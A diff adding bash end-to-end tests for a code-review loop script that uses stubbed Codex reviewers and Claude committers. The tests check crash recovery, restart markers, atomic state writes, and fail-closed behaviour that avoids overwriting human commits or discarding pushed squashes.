+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 1
+assert_eq "$(git -C "$E2E_CLONE" rev-list --count "$E2E_BASE..HEAD")" 1
+assert_eq "$(cat "$(e2e_state)/local/tip.sha" 2>/dev/null)" \
+          "$(git -C "$E2E_CLONE" rev-parse HEAD)"
+
+t "run.sh e2e: --restart consumes a held (--no-push) squash instead of pushing it"
+e2e_fixture
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4 --no-push
+assert_eq "$E2E_RC" 0
+if [[ -s "$(e2e_state)/local/finalized" ]]; then ok
+else bad "the held squash left no finalized marker"; fi
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED STUB_CODEX_BLOCKERS=1 \
+  --local --base main --dir "$E2E_CLONE" --max 1 --restart --no-push
+assert_eq "$E2E_RC" 1                          # cap hit mid-review, by design
+if [[ -e "$(e2e_state)/local/finalized" ]]; then
+  bad "--restart left the held-squash marker armed"; else ok; fi
+_iters=$(e2e_iters)
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2 --no-push   # plain rerun mid-review
+assert_eq "$E2E_RC" 0                          # APPROVED -> re-squash held again
+assert_eq "$(e2e_iters)" "$((_iters + 1))"     # a real new round ran first
+assert_eq "$(git -C "$E2E_CLONE" rev-list --count "$E2E_BASE..HEAD")" 1
+assert_eq "$(git -C "$E2E_CLONE" log -1 --format=%s)" 'Squashed subject line'
+
+t "run.sh e2e: --restart after an interrupted completion never reuses the old base"
+e2e_fixture
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4
+assert_eq "$E2E_RC" 0
+_st=$(e2e_state); _s=$(git -C "$E2E_CLONE" rev-parse HEAD)
+# Simulate a completion interrupted mid-transition: stale in-progress
+# markers left alongside the authoritative completed.sha.
+printf '%s\n' "$E2E_BASE" > "$_st/local/base.sha"
+printf '%s\n' "$_s"       > "$_st/local/tip.sha"
+printf '%s %s\n' "squash" "$_s" > "$_st/local/finalized"
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4 --restart
+assert_eq "$E2E_RC" 0
+if git -C "$E2E_CLONE" merge-base --is-ancestor "$_s" HEAD; then ok
+else bad "the restarted review rewrote the completed commit"; fi
+assert_eq "$(git -C "$E2E_CLONE" rev-list --count "$_s..HEAD")" 1
+
+t "run.sh e2e: a crashed --restart on a held squash cannot re-finalize the old review"
+e2e_fixture
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4 --no-push
+assert_eq "$E2E_RC" 0
+_st=$(e2e_state)
+if [[ -s "$_st/local/finalized" ]]; then ok
+else bad "the held squash left no finalized marker"; fi
+run_e2e STUB_NO_LOCAL_ARTIFACT=1 \
+  --local --base main --dir "$E2E_CLONE" --max 1 --restart --no-push
+assert_eq "$E2E_RC" 1                          # codex crashed before any artifact
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2 --no-push
+assert_eq "$E2E_RC" 0
+if [[ -s "$_st/iter-03/codex-review.md" ]]; then ok
+else bad "the plain retry re-finalized the superseded review without a new codex round"; fi
+assert_eq "$(git -C "$E2E_CLONE" rev-list --count "$E2E_BASE..HEAD")" 1
+
+t "run.sh e2e: an interrupted completion stays terminal past a human commit"
+e2e_fixture
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4
+assert_eq "$E2E_RC" 0
+_st=$(e2e_state); _s=$(git -C "$E2E_CLONE" rev-parse HEAD)
+# The crash window mark_completed leaves: completed.sha published, the
+# in-progress markers not yet cleared.
+printf '%s\n' "$E2E_BASE" > "$_st/local/base.sha"
+printf '%s\n' "$_s"       > "$_st/local/tip.sha"
+printf 'human follow-up\n' >> "$E2E_CLONE/f"
+git -C "$E2E_CLONE" commit -qam "human follow-up"
+_human=$(git -C "$E2E_CLONE" rev-parse HEAD)
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2
+assert_eq "$E2E_RC" 0
+assert_substr "$WORK/e2e.out" 'already completed'
+assert_eq "$(cat "$_st/local/completed.sha")" "$_s"   # never re-stamped at the human SHA
+assert_eq "$(git -C "$E2E_CLONE" rev-parse HEAD)" "$_human"
+
+t "run.sh e2e: --restart after a landed push completes it before the new review"
+e2e_fixture_origin
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4
+assert_eq "$E2E_RC" 0
+_st=$(e2e_state); _s=$(git -C "$E2E_CLONE" rev-parse HEAD)
+assert_eq "$(git -C "$E2E_REMOTE" rev-parse refs/heads/feature/x)" "$_s"
+# The crash window: push landed, terminal bookkeeping not yet done.
+printf '%s\n' "$E2E_BASE" > "$_st/local/base.sha"
+printf '%s\n' "$_s"       > "$_st/local/tip.sha"
+printf '%s %s\n' "squash" "$_s" > "$_st/local/finalized"
+printf '%s\n%s\n' "$E2E_REMOTE" "$E2E_REMOTE" > "$_st/local/origin.url"
+rm -f "$_st/local/completed.sha"
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2 --restart
+assert_eq "$E2E_RC" 0
+assert_eq "$(git -C "$E2E_REMOTE" rev-parse refs/heads/feature/x)" "$_s"  # never re-squashed
+if [[ -s "$_st/iter-03/codex-review.md" ]]; then ok
+else bad "the restart never ran a new review after completing the landed push"; fi
+assert_eq "$(cat "$_st/local/completed.sha")" "$_s"
+
+t "run.sh e2e: an interrupted --restart is re-driven, not resurrected, on a plain retry"
+# Mode (a): a --restart killed before its floor write landed leaves an
+# older/absent floor, but the durable restart-pending marker makes a plain
+# retry re-drive the restart instead of resuming the superseded review.
+e2e_fixture
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4 --no-push
+assert_eq "$E2E_RC" 0
+_st=$(e2e_state)
+[[ -s "$_st/local/finalized" ]] || bad "no held squash to supersede"
+printf '1\n' > "$_st/local/iter-floor"       # stale floor from before the kill
+: > "$_st/local/restart-pending"             # intent persisted before the kill
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2 --no-push
+assert_eq "$E2E_RC" 0
+assert_eq "$(cat "$_st/local/iter-floor")" 2         # re-driven to the real high-water
+if [[ -s "$_st/iter-03/codex-review.md" ]]; then ok  # the new review ran
+else bad "the plain retry did not re-drive the interrupted restart"; fi
+if [[ -e "$_st/local/restart-pending" ]]; then
+  bad "the restart-pending marker was not cleared once the new base was set"; else ok; fi
+
+t "run.sh e2e: an interrupted post-completion restart establishes the new review"
+# Mode (b): --restart completed an already-landed review (completed.sha
+# written) but was killed before establishing the new base. The pending
+# marker makes the plain retry finish the restart instead of exiting
+# "already completed".
+e2e_fixture_origin
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4
+assert_eq "$E2E_RC" 0
+_st=$(e2e_state); _s=$(git -C "$E2E_CLONE" rev-parse HEAD)
+printf '2\n' > "$_st/local/iter-floor"       # floor from the interrupted restart
+: > "$_st/local/restart-pending"             # intent survived the kill
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2
+assert_eq "$E2E_RC" 0
+assert_no_substr "$WORK/e2e.out" 'already completed'
+if [[ -s "$_st/iter-03/codex-review.md" ]]; then ok  # a fresh review ran
+else bad "the interrupted post-completion restart did not start the new review"; fi
+if [[ -e "$_st/local/restart-pending" ]]; then
+  bad "restart-pending survived the new review's establishment"; else ok; fi
+
+t "run.sh e2e: a validated round committed but not anchored is recovered"
+# The window between the validated turn's commit and local_record_tip: the
+# `done` receipt names the exact commit, tip.sha still the pre-turn tip. A
+# retry re-points the tip at that exact commit and continues past it.
+e2e_fixture
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 1
+_st=$(e2e_state); _round1=$(git -C "$E2E_CLONE" rev-parse HEAD)
+[[ "$_round1" != "$E2E_BASE" ]] || bad "round 1 produced no commit to anchor"
+printf '%s\n' "$E2E_BASE" > "$_st/local/tip.sha"     # unanchored
+printf 'done 1 %s %s\n' "$E2E_BASE" "$_round1" > "$_st/local/pending-turn"
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED STUB_CODEX_BLOCKERS=1 \
+  --local --base main --dir "$E2E_CLONE" --max 1
+assert_eq "$E2E_RC" 1                                # cap hit after codex iter-02
+assert_substr "$WORK/e2e.out" "anchored its commit $_round1"
+assert_eq "$(cat "$_st/local/tip.sha")" "$_round1"
+if git -C "$E2E_CLONE" merge-base --is-ancestor "$_round1" HEAD; then ok
+else bad "the recovered round's commit is unreachable from the resumed tip"; fi
+if [[ -s "$_st/iter-02/codex-review.md" ]]; then ok
+else bad "resume did not continue past the anchored round"; fi
+
+t "run.sh e2e: an unvalidated (pending) round drops its response and fails closed"
+# A `pending` receipt — the turn's outcome was never validated (rc, marker,
+# or artifact). It records no committed SHA, so a committed branch that
+# moved off the recorded tip cannot be told from a human commit: the round
+# is invalidated (response dropped) and the moved branch fails closed rather
+# than being force-reset over a possible human commit.
+e2e_fixture
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 1
+_st=$(e2e_state); _round1=$(git -C "$E2E_CLONE" rev-parse HEAD)
+printf '%s\n' "$E2E_BASE" > "$_st/local/tip.sha"     # unanchored
+printf 'pending 1 %s\n' "$E2E_BASE" > "$_st/local/pending-turn"
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 1
+assert_eq "$E2E_RC" 1
+assert_substr "$WORK/e2e.out" 'moved outside the loop'
+if [[ ! -e "$_st/local/pending-turn" ]]; then ok
+else bad "the pending receipt survived"; fi
+if [[ ! -s "$_st/iter-01/claude-response.md" ]]; then ok
+else bad "the unvalidated round's response was not invalidated"; fi
+assert_eq "$(git -C "$E2E_CLONE" rev-parse HEAD)" "$_round1"   # the branch was not clobbered
+
+t "run.sh e2e: a foreign commit at the tip is never anchored as the round"
+# The `done` commit is real, but the ref moved to a human commit stacked on
+# it: recovery must refuse rather than reset the branch back over the human.
+e2e_fixture
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 1
+_st=$(e2e_state); _round1=$(git -C "$E2E_CLONE" rev-parse HEAD)
+echo human >> "$E2E_CLONE/f"; git -C "$E2E_CLONE" commit -qam "foreign human"
+_human=$(git -C "$E2E_CLONE" rev-parse HEAD)
+printf '%s\n' "$E2E_BASE" > "$_st/local/tip.sha"
+printf 'done 1 %s %s\n' "$E2E_BASE" "$_round1" > "$_st/local/pending-turn"
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED STUB_CODEX_BLOCKERS=1 \
+  --local --base main --dir "$E2E_CLONE" --max 1
+assert_eq "$E2E_RC" 1
+assert_substr "$WORK/e2e.out" 'refusing to move it'
+assert_eq "$(git -C "$E2E_CLONE" rev-parse refs/heads/feature/x)" "$_human"  # untouched
+
+t "run.sh e2e: --restart anchors a validated round before re-basing"
+# A validated fix committed but not anchored, then --restart: recovery must
+# anchor the fix into the current state, not drop it with the receipt.
+e2e_fixture
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 1
+_st=$(e2e_state); _round1=$(git -C "$E2E_CLONE" rev-parse HEAD)
+printf '%s\n' "$E2E_BASE" > "$_st/local/tip.sha"
+printf 'done 1 %s %s\n' "$E2E_BASE" "$_round1" > "$_st/local/pending-turn"
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED STUB_CODEX_BLOCKERS=1 \
+  --local --base main --dir "$E2E_CLONE" --max 1 --restart
+assert_substr "$WORK/e2e.out" "anchored its commit $_round1"
+if git -C "$E2E_CLONE" merge-base --is-ancestor "$_round1" HEAD; then ok
+else bad "the restart dropped the validated round's commit"; fi
+
+t "run.sh e2e: a torn --restart floor fails closed instead of reading as 0"
+e2e_fixture
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4 --no-push
+assert_eq "$E2E_RC" 0
+_st=$(e2e_state)
+: > "$_st/local/iter-floor"          # a kill mid-write left it empty
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2 --no-push
+assert_eq "$E2E_RC" 1
+assert_substr "$WORK/e2e.out" 'empty or malformed'
+if [[ -s "$_st/local/finalized" ]]; then ok
+else bad "the superseded held squash was landed despite a torn floor"; fi
+
+t "run.sh e2e: the --restart floor is published atomically"
+rm -f "$_st/local/iter-floor"
+# The kill fires from the mv the atomic publish performs: a plain '>'
+# write runs no mv, the run survives, and the rc assertion below fails.
+# (The subshell mutes the SIGKILL job notice; rc travels through a file.)
+( run_e2e STUB_KILL_AFTER_MV=iter-floor \
+    --local --base main --dir "$E2E_CLONE" --max 1 --restart --no-push
+  printf '%s\n' "$E2E_RC" > "$WORK/e2e-killed.rc" ) 2>/dev/null
+assert_eq "$(cat "$WORK/e2e-killed.rc")" 137     # SIGKILL at the publish
+if [[ -s "$_st/local/iter-floor" ]] \
+   && [[ "$(cat "$_st/local/iter-floor")" =~ ^[0-9]+$ ]]; then ok
+else bad "a kill right after the floor's publish left it torn"; fi
+
+t "run.sh e2e: a metadata-only hold at the remote head is not read as landed"
+# A metadata-only hold's SHA IS the base, which is also the remote head —
+# the shape that made the landed-squash shortcut fire for a review that
+# pushed nothing. The recorded kind is what separates them.
+e2e_fixture_origin
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2   # approve, nothing lands
+assert_eq "$E2E_RC" 0
+_st=$(e2e_state)
+printf '%s\n' "$E2E_BASE" > "$_st/local/base.sha"
+printf '%s\n' "$E2E_BASE" > "$_st/local/tip.sha"
+printf '%s %s\n' "nocommit" "$E2E_BASE" > "$_st/local/finalized"
+printf '%s\n%s\n' "$E2E_REMOTE" "$E2E_REMOTE" > "$_st/local/origin.url"
+rm -f "$_st/local/completed.sha"
+run_e2e --local --base main --dir "$E2E_CLONE" --max 1 --restart
+assert_no_substr "$WORK/e2e.out" 'already reached the remote'
+if [[ -e "$_st/local/finalized" ]]; then
+  bad "the superseded metadata-only hold survived the restart"; else ok; fi
+
+t "run.sh e2e: a plain rerun completes a landed push and exits terminal"
+e2e_fixture_origin
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4
+assert_eq "$E2E_RC" 0
+_st=$(e2e_state); _s=$(git -C "$E2E_CLONE" rev-parse HEAD)
+printf '%s\n' "$E2E_BASE" > "$_st/local/base.sha"     # the crash window
+printf '%s\n' "$_s"       > "$_st/local/tip.sha"
+printf '%s %s\n' "squash" "$_s" > "$_st/local/finalized"
+printf '%s\n%s\n' "$E2E_REMOTE" "$E2E_REMOTE" > "$_st/local/origin.url"
+rm -f "$_st/local/completed.sha"
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2
+assert_eq "$E2E_RC" 0
+assert_substr "$WORK/e2e.out" 'already reached the remote'
+assert_eq "$(cat "$_st/local/completed.sha")" "$_s"
+assert_eq "$(git -C "$E2E_REMOTE" rev-parse refs/heads/feature/x)" "$_s"
+
+t "run.sh e2e: --restart --no-push on a landed squash refuses to discard it"
+e2e_fixture_origin
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4
+assert_eq "$E2E_RC" 0
+_st=$(e2e_state); _s=$(git -C "$E2E_CLONE" rev-parse HEAD)
+printf '%s\n' "$E2E_BASE" > "$_st/local/base.sha"       # the crash window again
+printf '%s\n' "$_s"       > "$_st/local/tip.sha"
+printf '%s %s\n' "squash" "$_s" > "$_st/local/finalized"
+printf '%s\n%s\n' "$E2E_REMOTE" "$E2E_REMOTE" > "$_st/local/origin.url"
+rm -f "$_st/local/completed.sha"
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2 --restart --no-push
+assert_eq "$E2E_RC" 1
+assert_substr "$WORK/e2e.out" 'did not complete'
+if [[ -s "$_st/local/finalized" ]]; then ok
+else bad "--no-push discarded a landed squash's marker"; fi
+assert_eq "$(git -C "$E2E_REMOTE" rev-parse refs/heads/feature/x)" "$_s"
+
+t "run.sh e2e: --restart with an unreachable remote refuses to discard a hold"
+git -C "$E2E_CLONE" remote set-url origin "$WORK/no-such-remote-$RANDOM.git"
+printf '%s\n%s\n' "$(git -C "$E2E_CLONE" remote get-url origin)" \
+                  "$(git -C "$E2E_CLONE" remote get-url origin)" > "$_st/local/origin.url"
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2 --restart
+assert_eq "$E2E_RC" 1
+assert_substr "$WORK/e2e.out" 'refusing to discard'
+if [[ -s "$_st/local/finalized" ]]; then ok
+else bad "an unreachable remote let the restart discard a possibly-landed squash"; fi
+
+t "run.sh e2e: an interrupted --restart consume still supersedes a held squash"
+e2e_fixture
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4 --no-push
+assert_eq "$E2E_RC" 0
+_st=$(e2e_state)
+printf '2\n' > "$_st/local/iter-floor"   # --restart persisted its intent, then died
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2 --no-push
+assert_eq "$E2E_RC" 0
+if [[ -s "$_st/iter-03/codex-review.md" ]]; then ok
+else bad "the plain retry landed the superseded held squash without a new review"; fi
+
+t "run.sh e2e: a crashed --restart cannot resume onto the old review's approval"
+e2e_fixture
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2    # APPROVED, no rounds -> completed
+assert_eq "$E2E_RC" 0
+printf 'human follow-up\n' >> "$E2E_CLONE/f"
+git -C "$E2E_CLONE" commit -qam "human follow-up"
+_human=$(git -C "$E2E_CLONE" rev-parse HEAD)
+run_e2e STUB_NO_LOCAL_ARTIFACT=1 --local --base main --dir "$E2E_CLONE" --max 2 --restart
+assert_eq "$E2E_RC" 1                                     # codex crashed before any artifact
+run_e2e --local --base main --dir "$E2E_CLONE" --max 2    # plain retry of the restarted review
+assert_eq "$E2E_RC" 0
+if [[ -s "$(e2e_state)/iter-02/codex-review.md" ]]; then ok   # a REAL round reviewed the new head
+else bad "the retry completed without a codex round reviewing the new head"; fi
+assert_eq "$(cat "$(e2e_state)/local/completed.sha" 2>/dev/null)" "$_human"
 
 # --- summary ---------------------------------------------------------------
 
